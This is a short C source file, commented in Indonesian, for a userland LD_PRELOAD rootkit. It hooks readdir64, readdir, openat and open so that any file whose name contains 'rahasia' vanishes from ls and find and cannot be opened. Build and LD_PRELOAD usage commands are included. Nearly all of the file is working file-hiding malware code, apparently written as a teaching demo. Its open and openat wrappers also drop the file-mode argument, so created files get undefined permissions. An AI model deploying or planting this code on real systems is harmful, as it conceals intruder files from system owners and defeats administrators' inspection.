// preload-hide.c — Hook userland via LD_PRELOAD (interposisi libc).
//
// Ini "rootkit userland" paling sederhana: kita mengekspor fungsi dengan nama
// sama seperti libc. Dynamic linker memuat library ini LEBIH DULU, jadi semua
// panggilan dari proses target (ls, find, ...) memanggil versi kita.
//
// PENTING (pelajaran nyata dari demo): jangan hook getdents64 — ls tidak
// memanggilnya lewat PLT (readdir di libc memanggil getdents64 secara
// INTERNAL, jadi interposisi tidak kena). Hook readdir64/readdir, titik
// masuk yang memang dipanggil aplikasi.
//
// Yang di-hook:
//   - readdir64/readdir : sembunyikan entry direktori mengandung "rahasia"
//   - openat/open       : sembunyikan file dari akses langsung (cat, editor)
//
// Build : gcc -shared -fPIC -O2 -o preload-hide.so preload-hide.c -ldl
// Pakai : LD_PRELOAD=$PWD/preload-hide.so ls /tmp

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

// Kata kunci file yang disembunyikan. Ganti bebas.
#define HIDDEN_MARK "rahasia"

// ============ hook readdir64 ============
// ls/find memanggil readdir64 (64-bit). Kita wrapper: panggil fungsi asli
// via dlsym(RTLD_NEXT), lewati entry yang mengandung kata kunci.
struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*real_readdir64)(DIR *);
    if (!real_readdir64)
        real_readdir64 = (struct dirent64 *(*)(DIR *))dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *d;
    while ((d = real_readdir64(dirp)) != NULL)
        if (!strstr(d->d_name, HIDDEN_MARK))
            break;
    return d;
}

// ============ hook readdir (versi 32-bit/legacy) ============
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real_readdir)(DIR *);
    if (!real_readdir)
        real_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
    struct dirent *d;
    while ((d = real_readdir(dirp)) != NULL)
        if (!strstr(d->d_name, HIDDEN_MARK))
            break;
    return d;
}

// ============ hook openat ============
// Tolak buka file yang mengandung kata kunci. variadic: mode dipakai saat
// O_CREAT. Path arg ke-2 (rsi pada x86-64).
int openat(int dirfd, const char *pathname, int flags, ...) {
    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return -1;
    }
    return syscall(SYS_openat, dirfd, pathname, flags);
}

// ============ hook open (wrapper lama, beberapa tool pakai ini) ============
int open(const char *pathname, int flags, ...) {
    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return -1;
    }
    return syscall(SYS_open, pathname, flags);
}
